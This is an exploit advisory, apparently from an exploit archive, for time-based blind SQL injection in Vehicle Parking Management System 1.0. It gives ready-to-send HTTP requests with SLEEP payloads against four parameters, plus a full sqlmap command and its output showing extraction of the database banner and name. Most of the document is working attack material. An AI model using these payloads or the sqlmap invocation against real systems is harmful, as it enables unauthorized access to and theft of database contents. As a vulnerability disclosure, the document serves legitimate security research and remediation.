@@ -1,0 +1,167 @@
+id: 36579
+date: 07/21/2021
+title: Vehicle Parking Management System 1.0 SQL Injection Vulnerability
+author: faisalfs10x
+cves: 
+
+# Exploit Title: Vehicle Parking Management System - Multiple time-based SQL Injection
+# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
+# Vendor Homepage: https://phpgurukul.com
+# Software Link: https://phpgurukul.com/vehicle-parking-management-system-using-php-and-mysql/
+# Version: 1.0
+# Tested on: Windows 10, XAMPP
+
+
+################
+# Description  #
+################
+
+# The system is vulnerable to time-based SQL injection on multiple endpoints. Based on the SLEEP(N) function payload that will sleep for a number of seconds used on the mentioned parameters below, the server response is about (N) seconds delay respectively which mean it is vulnerable to MySQL Blind (Time Based). An attacker can use sqlmap to further the exploitation for extracting sensitive information from the database.
+
+
+#####################
+# PoC of detection  #
+#####################
+
+
+PoC #1) param editid - time-based SQLi
+Payload: '+AND+(SELECT+5+FROM+(SELECT(SLEEP(5)))B)--+
+Request: The response duration = 3251 bytes | 5,024 millis
+========
+
+GET /vpms/edit-category.php?editid=5'+AND+(SELECT+5+FROM+(SELECT(SLEEP(5)))B)--+ HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=01nt1pa7lgtioktv5ii907c8l3
+Upgrade-Insecure-Requests: 1
+Referer: http://localhost/vpms/manage-category.php
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+---
+
+
+PoC #2) param viewid - time-based SQLi
+Payload: '+AND+(SELECT+5+FROM+(SELECT(SLEEP(5)))B)--+
+Request: The response duration = 10234 bytes | 5,027 millis
+========
+
+GET /vpms/view-outgoingvehicle-detail.php?viewid=4'+AND+(SELECT+5+FROM+(SELECT(SLEEP(5)))B)--+ HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=01nt1pa7lgtioktv5ii907c8l3
+Upgrade-Insecure-Requests: 1
+Referer: http://localhost/vpms/manage-outgoingvehicle.php
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+---
+
+
+PoC #3) param catename - time-based SQLi
+Payload: ' AND (SELECT 1 FROM (SELECT(SLEEP(2)))A) AND 'B'='B
+Request: The response duration = 10234 bytes | 2,037 millis
+========
+
+POST /vpms/add-category.php HTTP/1.1
+Host: localhost
+Origin: http://localhost
+Cookie: PHPSESSID=01nt1pa7lgtioktv5ii907c8l3
+Upgrade-Insecure-Requests: 1
+Referer: http://localhost/vpms/add-category.php
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryps9OB3CnjLULpt3n
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Length: 290
+
+------WebKitFormBoundaryps9OB3CnjLULpt3n
+Content-Disposition: form-data; name="catename"
+
+VIP' AND (SELECT 1 FROM (SELECT(SLEEP(2)))A) AND 'B'='B
+------WebKitFormBoundaryps9OB3CnjLULpt3n
+Content-Disposition: form-data; name="submit"
+
+žée
+------WebKitFormBoundaryps9OB3CnjLULpt3n--
+
+---
+
+
+PoC #4) param viewid - time-based SQLi
+Payload: '+AND+(SELECT+7+FROM+(SELECT(SLEEP(3)))A)--+
+Request: The response duration = 11452 bytes | 3,041 millis
+========
+
+GET /vpms/view-incomingvehicle-detail.php?viewid=7'+AND+(SELECT+7+FROM+(SELECT(SLEEP(3)))A)--+ HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=01nt1pa7lgtioktv5ii907c8l3
+Upgrade-Insecure-Requests: 1
+Referer: http://localhost/vpms/manage-incomingvehicle.php
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+---
+
+
+########################
+# PoC of exploitation  #
+########################
+
+# Run sqlmap to extract current database name:
+
+$ sqlmap -u "http://localhost/vpms/edit-category.php?editid=5" --cookie="PHPSESSID=01nt1pa7lgtioktv5ii907c8l3" --timeout=30 --retries=3 -p "editid" --dbms="MySQL" --level=3 --risk=3 --threads=10 --time-sec=5 -b --current-db --batch --answers="crack=N,dict=N,continue=Y,quit=N" --technique=T
+
+
+###########
+# Output  #
+###########
+
+
+[INFO] testing connection to the target URL
+[INFO] checking if the target is protected by some kind of WAF/IPS
+[WARNING] heuristic (basic) test shows that GET parameter 'editid' might not be injectable
+[INFO] testing for SQL injection on GET parameter 'editid'
+[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[WARNING] time-based comparison requires larger statistical model, please wait............................ (done)                                                                                    
+[INFO] GET parameter 'editid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
+[INFO] checking if the injection point on GET parameter 'editid' is a false positive
+GET parameter 'editid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 58 HTTP(s) requests:
+---
+Parameter: editid (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: editid=5' AND (SELECT 7492 FROM (SELECT(SLEEP(5)))DaOq)-- Otxt
+---
+[INFO] the back-end DBMS is MySQL
+[INFO] fetching banner
+multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
+[INFO] retrieved: 
+[WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+10.1.19-MariaDB
+web server operating system: Windows
+web application technology: Apache 2.4.23, PHP 5.6.24
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+banner: '10.1.19-MariaDB'
+[INFO] fetching current database
+[INFO] retrieving the length of query output
+[INFO] retrieved: 6
+[INFO] retrieved: vpmsdb           
+current database: 'vpmsdb'
+
+#  0day.today [2023-03-23]  #
